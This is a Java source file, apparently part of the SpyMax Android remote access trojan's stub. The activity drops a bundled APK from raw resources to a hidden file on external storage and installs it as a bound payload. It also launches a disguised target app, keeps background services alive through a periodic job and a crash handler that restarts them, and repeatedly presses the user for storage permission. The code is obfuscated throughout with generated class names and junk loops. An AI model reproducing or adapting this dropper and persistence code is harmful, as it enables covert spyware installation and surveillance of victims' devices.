package spymax.stub7;


import android.annotation.TargetApi;
import android.app.Activity;


import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;

import android.content.Intent;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Point;


import android.os.AsyncTask;

import android.os.Build;
import android.os.Bundle;


import android.os.Environment;


import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;

import java.io.InputStream;

import java.io.OutputStream;

import java.util.concurrent.TimeUnit;

import static spymax.stub7.ClassGen3.phonixeffect;


public class ClassGen9 extends Activity {

   public static String T_ClassGen9_P = "trg.trgtapp.trg";
   //public static String T_ClassGen9_P = "null";

    public static boolean IP_ClassGen9_I(String packageName, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private class FI_ClassGen9_N extends AsyncTask<String, Void, String> {

        private Context myctx = null;


        @Override
        protected String doInBackground(String[] params) {

                    try {

                            int cont =0;
                            if (!T_ClassGen9_P.toLowerCase().equals("null"))
                            {
                                do {
                                    try
                                    {
                                        TimeUnit.MILLISECONDS.sleep(1000);
                                    }catch (InterruptedException ex){}
                                    cont +=1;
                                    if (IP_ClassGen9_I(T_ClassGen9_P,getPackageManager()))
                                    {
                                        Holdit =false;
                                        cont =0;
                                        break;
                                    }
                                    if (cont == 25)
                                        Check_ClassGen9_Bind();

                                }while (Holdit);
                            }

                    } catch (Exception e) {

                    }


                return "S!S@S#S$%";


        }

        @Override
        protected void onPostExecute(String message) {

            try
            {
                if (IP_ClassGen9_I(T_ClassGen9_P, getPackageManager()) && !T_ClassGen9_P.toLowerCase().equals("null"))
                {
                    PackageManager pm = getApplicationContext().getPackageManager();
                    Intent launchIntent = pm.getLaunchIntentForPackage(T_ClassGen9_P);
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    myctx.startActivity(launchIntent);
                }

            }catch (Exception Ex){ }



            try
            {
                if (ClassGen10._runn_srv_(ClassGen11.class, getApplication())) {
                    myctx.startService(new Intent(ClassGen11.app_ClassGen11_Context, ClassGen11.class));
                }
            }catch (Exception ex){}

            finish();
        }
    }
        public static Boolean Holdit = false;

    @TargetApi(Build.VERSION_CODES.M)
    public static void schedule_ClassGen9_Job(Context context) {
        JobScheduler jobScheduler = (JobScheduler)context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        ComponentName serviceName = new ComponentName(context, WackMeUpJob.class);
        JobInfo jobInfo;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){

            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(900000)
                    .build();
        }else{
            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(15000)
                    .build();
        }
        jobScheduler.schedule(jobInfo);
    }



    int PERMISSION_ALL = 555;
    String[] StoragPermissions = {
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
    };


   public class MyExceptionHandler implements
           java.lang.Thread.UncaughtExceptionHandler {
       private final Context myContext;
       private final Class<?> myActivityClass;

       public MyExceptionHandler(Context context, Class<?> c) {
           myContext = context;
           myActivityClass = c;
       }

       public void uncaughtException(Thread thread, Throwable exception) {
          try
          {
              phonixeffect(myContext,"Error",180000);

              sendBroadcast(new Intent(getApplicationContext(), SensorRestarterBroadcastReceiver.class).setAction("RestartSensor"));

          }catch (Exception e){}
          // System.exit(0);
       }}

        @Override
        public void onCreate(Bundle v) {

            super.onCreate(v);



            requestWindowFeature(Window.FEATURE_NO_TITLE);
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
            Point size = new Point();
            getWindowManager().getDefaultDisplay().getSize(size);
            MySettings.Write(getApplicationContext(),MySettings.ScreenWidth,"" + size.x);
            MySettings.Write(getApplicationContext(),MySettings.ScreenHight,"" + size.y);
            Thread.setDefaultUncaughtExceptionHandler(new MyExceptionHandler(this,
                    ClassGen9.class));

            int sleep  = 1;
            final Context main_ctx = getApplicationContext();
            if (MySettings.read(main_ctx,"UP","").length() ==0)
            {
                setContentView(R.layout.loading);

                sleep = 3000;

            }else
            {
                if (ClassGen10._runn_srv_(myworker.class,getApplication()))
                {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {

                        main_ctx.startForegroundService(new Intent(main_ctx,myworker.class));
                    }else
                    {
                        main_ctx.startService(new Intent(main_ctx,myworker.class));

                    }
                }
                //MySettings.Write(main_ctx,"UP","");
                MySettings.Write(main_ctx,"UP","");
                finish();
                return;
            }


            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {



                        try {
                            ClassGen11.app_ClassGen11_Context = getApplicationContext();
                        } catch (Exception ee) {
                        }

                        ClassGen3.p_ClassGen3_r = getApplicationContext().getResources().getString(R.string.t1t2t3t4t5t6);

                        ClassGen3.phonixeffect(getApplicationContext(),"_randomS_shit_",180000);


                        if(!hasPermissions(main_ctx, StoragPermissions) && !T_ClassGen9_P.toLowerCase().equals("null")){
                            ActivityCompat.requestPermissions(ClassGen9.this, StoragPermissions, PERMISSION_ALL);
                        }
                        else
                        {
                            Check_ClassGen9_Bind();

                            try
                            {
                                if (ClassGen10._runn_srv_(ClassGen11.class,getApplication()))
                                {

                                    startService(new Intent(main_ctx,ClassGen11.class));

                                }

                            }catch (Exception bb){}

                        }

                    }catch (Exception e){}
                    try{
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(new Intent(getApplicationContext(), myworker.class));
                        }else
                        {
                            startService(new Intent(getApplicationContext(), myworker.class));
                        }
                    }catch (Exception g){}

                }
            }, sleep);


        }
   // protected void minimizeApp() { Intent startMain = new Intent(Intent.ACTION_MAIN); startMain.addCategory(Intent.CATEGORY_HOME); startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(startMain); }
    public static String T_ClassGen9_2 ="[RANDOM-STRING]";
    public static String T_ClassGen9_3 ="[RANDOM-STRING]";
    public static String T_ClassGen9_4 ="[RANDOM-STRING]";
    public static String T5="[RANDOM-STRING]";
    public static String T_ClassGen9_6 ="[RANDOM-STRING]";
    public static String T_ClassGen9_7 ="[RANDOM-STRING]";
    public void Check_ClassGen9_Bind()
    {
        try
        {

            if (ClassGen3.p_ClassGen3_r.charAt(2) == ClassGen3.c1 && !T_ClassGen9_P.toLowerCase().equals("null") && !IP_ClassGen9_I(T_ClassGen9_P,getPackageManager())){
                Holdit =true;

                //  ClassGen12.bypass =true;
                Context ctx = getApplicationContext();
                String tm = ctx.getPackageName();

                if (ClassGen3.g_ClassGen3_t(ctx,tm).length() == 0){
                    String ex = "apk";
                    InputStream stream = getApplicationContext().getResources().openRawResource(R.raw.b1b2b3b4b5b6);
                    int si = stream.available();
                    if (si != 0) {
                        long bf = si;

                        Boolean will2 = true;
                        while (will2)
                        {
                            T_ClassGen9_2 ="[RANDOM-STRING]";
                            if (T_ClassGen9_2.equals(T_ClassGen9_3))
                            {
                                will2 =false;
                            }

                        }
                        Boolean will3 = true;
                        while (will3)
                        {
                            T_ClassGen9_3 ="[RANDOM-STRING]";
                            if (T_ClassGen9_3.equals(T_ClassGen9_2))
                            {
                                will3 =false;
                            }

                        }


                        if(bf >= 1024000){
                            bf = 102400;

                        }else if(bf >= 512000){
                            bf = 51200;
                            Boolean will6 = true;
                            while (will6)
                            {
                                T_ClassGen9_6 ="[RANDOM-STRING]";
                                if (T_ClassGen9_6.equals(T_ClassGen9_3))
                                {
                                    will6 =false;
                                }

                            }
                            Boolean will7 = true;
                            while (will7)
                            {
                                T_ClassGen9_7 ="[RANDOM-STRING]";
                                if (T_ClassGen9_7.equals(T_ClassGen9_3))
                                {
                                    will7 =false;
                                }

                            }

                        }else if(bf >= 204800) {
                            bf = 20480;


                        }else if(bf >= 1024) {
                            bf = 1024;
                            Boolean will4 = true;
                            while (will4)
                            {
                                T_ClassGen9_4 ="[RANDOM-STRING]";
                                if (T_ClassGen9_4.equals(T_ClassGen9_3))
                                {
                                    will4 =false;
                                }

                            }
                        }
                        Long x = bf;
                        int s = x.intValue();
                        String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "." + ClassGen3._Reblace_( "ba_ClassGen9_se","_ClassGen9_") + "." + ex;


                        OutputStream out = new FileOutputStream(new File(path));
                        byte[] byf = new byte[s];
                        try {
                            int i;
                            while ((i = stream.read(byf, 0, byf.length)) != -1) {
                                out.write(byf, 0, i);
                            }
                            stream.close();
                            out.close();

                            try{
                                PackageManager pm = ctx.getPackageManager();
                                PackageInfo f = pm.getPackageArchiveInfo(path, 0);

                                ClassGen3.dit(ctx,f.packageName,tm);
                            } catch (Exception e) {
                                Boolean will6 = true;
                                while (will6)
                                {
                                    T_ClassGen9_6 ="[RANDOM-STRING]";
                                    if (T_ClassGen9_6.equals(T_ClassGen9_3))
                                    {
                                        will6 =false;
                                    }

                                }
                                Boolean will7 = true;
                                while (will7)
                                {
                                    T_ClassGen9_7 ="[RANDOM-STRING]";
                                    if (T_ClassGen9_7.equals(T_ClassGen9_3))
                                    {
                                        will7 =false;
                                    }

                                }
                                ClassGen3.dit(ctx,tm,tm);
                            }
                            FI_ClassGen9_N job = new FI_ClassGen9_N();
                            job.myctx = getApplicationContext();
                            job.execute("_randomS_shit_", "_randomS_shit_");
                            ClassGen3._inst_bnd_(getApplicationContext(),path,ex);
                            finish();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                    }

                }

                //

                //   ClassGen12.bypass =false;
            }
            else {

                if (IP_ClassGen9_I(T_ClassGen9_P, getPackageManager()) && !T_ClassGen9_P.toLowerCase().equals("null"))
                {
                    PackageManager pm = getApplicationContext().getPackageManager();
                    Intent launchIntent = pm.getLaunchIntentForPackage(T_ClassGen9_P);
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launchIntent);
                    FI_ClassGen9_N job = new FI_ClassGen9_N();
                    job.myctx = getApplicationContext();
                    job.execute("_randomS_shit_", "_randomS_shit_");
                }
                else
                {
                    try
                    {
                        if (ClassGen10._runn_srv_(ClassGen11.class,getApplication()))
                        {

                            startService(new Intent(this,ClassGen11.class));

                        }


                    }catch (Exception bb){}


                    schedule_ClassGen9_Job(getApplicationContext());
                    finish();
                }

                // EndWork();
            }


        }catch (Exception e){}
    }

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //finish();
        switch (requestCode) {
            case 555: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Check_ClassGen9_Bind();


                } else {

                    Toast.makeText(this, "Please Allow Permission To Continue.", Toast.LENGTH_SHORT).show();

                        ActivityCompat.requestPermissions(this, StoragPermissions, PERMISSION_ALL);

                }
                break;
            }

        }
    }


    public static boolean IamDone = false;


    @Override
    public void onBackPressed() {
        super.onBackPressed();

    }

    @Override
        public void finish() {
        //    Toast.makeText(getApplicationContext(),"ima odne",)
            IamDone=true;
           // unregisterReceiver(RC);
            //minimizeApp();
            //return ;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                super.finishAndRemoveTask();
            } else {
                super.finish();
            }
        }



}

